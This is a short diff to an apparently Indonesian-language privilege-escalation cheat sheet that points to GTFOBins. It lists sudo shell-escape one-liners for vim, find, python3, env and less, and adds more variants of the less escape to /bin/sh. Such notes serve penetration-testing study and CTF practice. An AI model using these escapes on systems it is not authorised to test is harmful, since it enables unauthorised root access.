@@ -37,10 +37,13 @@ Untuk setiap binary yang diizinkan → cek di [https://gtfobins.github.io](https
 
 ```bash
 sudo vim -c ':!/bin/sh'                            # vim usr/bin/vim
-sudo less /etc/profile  -> !/bin/sh                 # less/more usr/bin/less/more
 sudo find . -exec /bin/sh \; -quit                 # find usr/bin/find
 sudo python3 -c 'import os;os.system("/bin/sh")'   # python3 usr/bin/python3
 sudo env /bin/sh                                   # env usr/bin/env
+sudo less /etc/profile  -> !/bin/sh                 # less/more usr/bin/less/more
+sudo less -p '!/bin/sh' /etc/profile
+sudo less /etc/profile
+!/bin/sh 
 ```
 
 | Binary | Metode | Catatan |
